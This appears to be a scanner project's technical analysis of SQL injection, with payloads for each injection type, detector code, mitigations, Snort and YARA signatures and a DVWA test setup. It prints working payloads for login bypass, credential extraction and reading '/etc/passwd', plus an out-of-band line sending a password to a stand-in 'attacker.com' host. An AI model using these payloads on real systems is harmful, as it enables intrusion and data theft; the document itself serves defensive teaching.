# 💉 SQL Injection - Technical Analysis

## Executive Summary

**Vulnerability:** SQL Injection (SQLi)  
**OWASP Rank:** #3 (2021), #1 (Historical)  
**CVSS Score:** 9.0-10.0 (Critical)  
**First Documented:** 1998  
**Impact:** Data breach, authentication bypass, remote code execution

## Vulnerability Overview

SQL Injection is a code injection technique that exploits security vulnerabilities in an application's database layer. Attackers insert malicious SQL statements into input fields, manipulating the backend database to:

- Extract sensitive data (credentials, PII, financial records)
- Bypass authentication and authorization
- Modify or delete database contents
- Execute administrative operations
- Achieve remote code execution (in some configurations)

## Technical Details

### Root Cause

SQL Injection occurs when:
1. User input is incorporated into SQL queries
2. Input is not properly sanitized or validated
3. Dynamic query construction without parameterization
4. Insufficient input validation on the application layer

**Vulnerable Code Example (PHP):**
```php
// VULNERABLE: Direct string concatenation
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysqli_query($conn, $query);
```

**Attack Payload:**
```sql
Username: admin' OR '1'='1' --
Password: anything

Resulting Query:
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
                                              ↑ Always true
```

## SQL Injection Types

### 1. Error-Based SQL Injection

**Technique:** Trigger database errors to extract information

**Example Payload:**
```sql
' OR 1=1 UNION SELECT NULL, table_name FROM information_schema.tables--
```

**Detection Pattern:**
- Database error messages in response
- Stack traces revealing database structure
- SQL syntax errors

**C3NT1P3D3 Detection:**
```cpp
std::vector<std::string> errorSignatures = {
    "SQL syntax",
    "mysql_fetch",
    "ORA-01756",
    "Microsoft OLE DB Provider",
    "PostgreSQL query failed",
    "SQLite3::SQLException"
};
```

### 2. Boolean-Based Blind SQL Injection

**Technique:** Infer data based on true/false responses

**Example Payloads:**
```sql
' AND 1=1--  (True condition - normal response)
' AND 1=2--  (False condition - different response)

' AND (SELECT LENGTH(password) FROM users WHERE id=1)>5--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a'--
```

**Detection Pattern:**
- Response differs based on condition
- Content length variations
- HTTP status code changes

### 3. Union-Based SQL Injection

**Technique:** Combine results from multiple SELECT statements

**Example Payload:**
```sql
' UNION SELECT username, password, email FROM users--
' UNION SELECT NULL, version(), database()--
' UNION SELECT NULL, load_file('/etc/passwd'), NULL--
```

**Requirements:**
- Same number of columns in both queries
- Compatible data types
- UNION operator support

### 4. Time-Based Blind SQL Injection

**Technique:** Infer data based on response time delays

**Example Payloads:**
```sql
-- MySQL
' OR IF(1=1, SLEEP(5), 0)--

-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- SQL Server
'; WAITFOR DELAY '00:00:05'--

-- Oracle
' OR DBMS_LOCK.SLEEP(5)--
```

**Detection Pattern:**
- Response time > baseline + delay
- Consistent timing differences
- No visible output changes

### 5. Out-of-Band SQL Injection

**Technique:** Exfiltrate data via DNS/HTTP requests

**Example Payload (MySQL):**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 1), '.attacker.com\\a'))--
```

## C3NT1P3D3 Detection Implementation

### Multi-Vector Testing Strategy

```cpp
class SQLInjectionDetector {
private:
    struct TestPayload {
        std::string payload;
        std::string type;  // error, boolean, union, time
        std::function<bool(const std::string&)> validator;
    };
    
    std::vector<TestPayload> payloads_ = {
        // Error-based
        {"' OR '1'='1", "error", &containsErrorSignature},
        {"1' AND 1=CONVERT(int, (SELECT @@version))--", "error", &containsErrorSignature},
        
        // Boolean-based
        {"' AND '1'='1", "boolean", &checkBooleanResponse},
        {"' AND '1'='2", "boolean", &checkBooleanResponse},
        
        // Union-based
        {"' UNION SELECT NULL--", "union", &checkUnionResponse},
        {"' UNION SELECT NULL,NULL,NULL--", "union", &checkUnionResponse},
        
        // Time-based
        {"'; WAITFOR DELAY '00:00:05'--", "time", &checkTimeDelay},
        {"' OR SLEEP(5)--", "time", &checkTimeDelay}
    };
    
public:
    ModuleResult run(const std::string& target) override {
        for (const auto& test : payloads_) {
            std::string response = sendHTTPRequest(target, test.payload);
            
            if (test.validator(response)) {
                return createVulnerableResult(test.type, test.payload);
            }
        }
        return createSafeResult();
    }
};
```

### HTTP Request Construction

```cpp
std::string SQLInjectionDetector::sendHTTPRequest(
    const std::string& target, 
    const std::string& payload) {
    
    // Test multiple injection points
    std::vector<std::string> injectionPoints = {
        "/login.php?user=" + urlEncode(payload),
        "/search?q=" + urlEncode(payload),
        "/api/users/" + urlEncode(payload)
    };
    
    for (const auto& endpoint : injectionPoints) {
        std::string request = 
            "GET " + endpoint + " HTTP/1.1\r\n"
            "Host: " + target + "\r\n"
            "User-Agent: C3NT1P3D3-Scanner/2.0\r\n"
            "Accept: */*\r\n"
            "Connection: close\r\n\r\n";
        
        // Send and receive response
        std::string response = sendAndReceive(request);
        
        if (!response.empty()) {
            return response;
        }
    }
    
    return "";
}
```

### Response Analysis

```cpp
bool SQLInjectionDetector::containsErrorSignature(const std::string& response) {
    // Database-specific error patterns
    std::vector<std::regex> patterns = {
        std::regex("SQL syntax.*MySQL", std::regex::icase),
        std::regex("Warning.*mysql_.*", std::regex::icase),
        std::regex("ORA-\\d{5}", std::regex::icase),
        std::regex("PostgreSQL.*ERROR", std::regex::icase),
        std::regex("SQLite3::SQLException", std::regex::icase),
        std::regex("Microsoft SQL Native Client error", std::regex::icase)
    };
    
    for (const auto& pattern : patterns) {
        if (std::regex_search(response, pattern)) {
            return true;
        }
    }
    
    return false;
}

bool SQLInjectionDetector::checkTimeDelay(const std::string& response, 
                                          std::chrono::milliseconds elapsed) {
    // Expected delay: 5 seconds
    // Allow 1 second tolerance for network latency
    return elapsed > std::chrono::milliseconds(4000) && 
           elapsed < std::chrono::milliseconds(7000);
}
```

## MITRE ATT&CK Mapping

**Technique:** T1190 - Exploit Public-Facing Application  
**Tactic:** Initial Access  
**Sub-Techniques:**
- T1213 - Data from Information Repositories
- T1078 - Valid Accounts (via authentication bypass)

### Attack Chain

```
Reconnaissance → Initial Access → Credential Access → Exfiltration
                      ↓
                  T1190 (SQLi)
                      ↓
              Database Access
                      ↓
         Data Extraction / Privilege Escalation
```

## Exploitation Scenarios

### Scenario 1: Authentication Bypass

**Target:** Login form  
**Payload:** `admin' OR '1'='1' --`

```sql
-- Original Query
SELECT * FROM users WHERE username='admin' AND password='[user_input]'

-- Injected Query
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
                                              ↑ Always true, comment out rest
```

**Result:** Bypass authentication, access admin account

### Scenario 2: Data Exfiltration

**Target:** Search functionality  
**Payload:** `' UNION SELECT username, password, email FROM users--`

```sql
-- Original Query
SELECT product_name, price FROM products WHERE category='[user_input]'

-- Injected Query
SELECT product_name, price FROM products WHERE category='' 
UNION SELECT username, password FROM users--'
```

**Result:** Extract all usernames and passwords

### Scenario 3: Database Fingerprinting

**Payloads:**
```sql
-- MySQL
' AND @@version LIKE '%MySQL%'--

-- PostgreSQL
' AND version() LIKE '%PostgreSQL%'--

-- SQL Server
' AND @@version LIKE '%Microsoft%'--

-- Oracle
' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'--
```

**Result:** Identify database type for targeted attacks

## Mitigation Strategies

### 1. Parameterized Queries (Prepared Statements)

**Secure Code (PHP with PDO):**
```php
// SECURE: Parameterized query
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

**Secure Code (Python):**
```python
# SECURE: Parameterized query
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
               (username, password))
```

### 2. Input Validation

```cpp
bool validateInput(const std::string& input) {
    // Whitelist approach
    std::regex allowedPattern("^[a-zA-Z0-9_@.-]+$");
    
    if (!std::regex_match(input, allowedPattern)) {
        return false;
    }
    
    // Blacklist dangerous characters
    std::vector<std::string> blacklist = {"'", "\"", ";", "--", "/*", "*/", "xp_", "sp_"};
    
    for (const auto& dangerous : blacklist) {
        if (input.find(dangerous) != std::string::npos) {
            return false;
        }
    }
    
    return true;
}
```

### 3. Least Privilege Principle

```sql
-- Create read-only database user for web application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT ON database.* TO 'webapp'@'localhost';

-- Revoke dangerous permissions
REVOKE FILE ON *.* FROM 'webapp'@'localhost';
REVOKE PROCESS ON *.* FROM 'webapp'@'localhost';
```

### 4. Web Application Firewall (WAF)

**ModSecurity Rule Example:**
```apache
SecRule ARGS "@detectSQLi" \
    "id:1000,\
    phase:2,\
    block,\
    log,\
    msg:'SQL Injection Attack Detected'"
```

## Detection Signatures

### Snort Rules

```
alert tcp any any -> any 80 (msg:"SQL Injection - UNION SELECT"; 
  content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; 
  classtype:web-application-attack; sid:1000002;)

alert tcp any any -> any 80 (msg:"SQL Injection - OR 1=1"; 
  content:"OR"; nocase; content:"1=1"; nocase; distance:0; 
  classtype:web-application-attack; sid:1000003;)
```

### YARA Rule

```yara
rule SQLInjection_Pattern {
    meta:
        description = "Detects SQL injection patterns in HTTP traffic"
        author = "C3NT1P3D3 Team"
    
    strings:
        $union = /UNION\s+SELECT/i
        $or_true = /OR\s+['"]?1['"]?\s*=\s*['"]?1/i
        $comment = /--|\*\/|\*\*/
        $sleep = /SLEEP\s*\(/i
        $waitfor = /WAITFOR\s+DELAY/i
    
    condition:
        any of them
}
```

## Real-World Impact

### Notable Breaches

1. **Heartland Payment Systems (2008):**
   - 130 million credit cards stolen
   - $140M+ in damages
   - SQL injection in web application

2. **Sony Pictures (2011):**
   - 77 million accounts compromised
   - SQL injection in outdated web server
   - $171M in damages

3. **Yahoo (2012):**
   - 450,000 credentials leaked
   - Union-based SQL injection
   - Reputational damage

### Statistics

- **Prevalence:** 65% of web applications vulnerable (2023)
- **Average Cost:** $4.24M per data breach
- **Detection Time:** 207 days average
- **Remediation:** 73 days average

## Testing Recommendations

### Safe Testing Environment

```bash
# Deploy vulnerable test application
docker run -d -p 80:80 vulnerables/web-dvwa

# Run C3NT1P3D3 detection
./C3NT1P3D3-Comprehensive localhost --module sqli --output results.json

# Manual verification with sqlmap
sqlmap -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="security=low; PHPSESSID=..." --dbs
```

### Validation

- Test against DVWA (Damn Vulnerable Web Application)
- Verify against OWASP WebGoat
- Confirm detection of all SQLi types
- Ensure no false positives on parameterized queries

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CAPEC-66: SQL Injection](https://capec.mitre.org/data/definitions/66.html)
- [sqlmap - Automatic SQL Injection Tool](http://sqlmap.org/)

---

**Document Version:** 1.0  
**Last Updated:** October 2024  
**Author:** C3NT1P3D3 Security Research Team
